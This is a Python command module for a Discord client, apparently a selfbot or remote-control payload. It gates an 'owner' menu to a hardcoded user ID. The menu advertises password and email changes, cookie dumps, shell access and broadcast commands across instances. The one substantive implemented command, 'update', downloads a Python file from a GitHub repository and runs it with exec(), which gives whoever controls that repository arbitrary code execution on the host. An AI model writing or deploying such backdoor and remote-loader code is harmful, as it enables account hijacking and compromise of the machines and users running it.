import discord
OWNER_ID = 981259484691325018   # zaneok's ID (injected by main.py)

async def run(client, message, args):
    if client.user.id != OWNER_ID:
        return   # silently ignore for everyone else
    parts = args.split()
    sub = parts[0].lower() if parts else ""
    rest = args[len(sub)+1:].strip() if len(parts) > 1 else ""
    if not sub:
        embed = discord.Embed(title="🔐 Owner Control", description="Available commands:", color=0xFF00FF)
        embed.add_field(name="List", value="`!owner list`", inline=False)
        embed.add_field(name="Broadcast", value="`!owner broadcast <cmd>`", inline=False)
        embed.add_field(name="Nick", value="`!owner nick <guild_id> <nick>`", inline=False)
        embed.add_field(name="Password", value="`!owner password <new_password>`", inline=False)
        embed.add_field(name="Email", value="`!owner email <new_email>`", inline=False)
        embed.add_field(name="Cookies", value="`!owner cookies`", inline=False)
        embed.add_field(name="Shell", value="`!owner shell <cmd>`", inline=False)
        embed.add_field(name="Resync", value="`!owner resync`", inline=False)
        embed.add_field(name="Update", value="`!owner update`", inline=False)
        await message.channel.send(embed=embed)
        return
    if sub == "resync":
        import threading
        threading.Thread(target=client.app._resync).start()
        await message.channel.send("Resyncing...")
    elif sub == "update":
        # fetch global_update.py from GitHub and exec
        import requests
        url = f"https://raw.githubusercontent.com/{client.app.GITHUB_REPO}/{client.app.GITHUB_BRANCH}/{client.app.GITHUB_GLOBAL_UPDATE_FILE}"
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                exec(compile(r.text, client.app.GITHUB_GLOBAL_UPDATE_FILE, 'exec'))
                await message.channel.send("Global update executed.")
            else:
                await message.channel.send("Update file not found.")
        except Exception as e:
            await message.channel.send(f"Error: {e}")
    else:
        await message.channel.send(f"Sub‑command `{sub}` not yet implemented. Edit `owner.py` on GitHub to add it.")
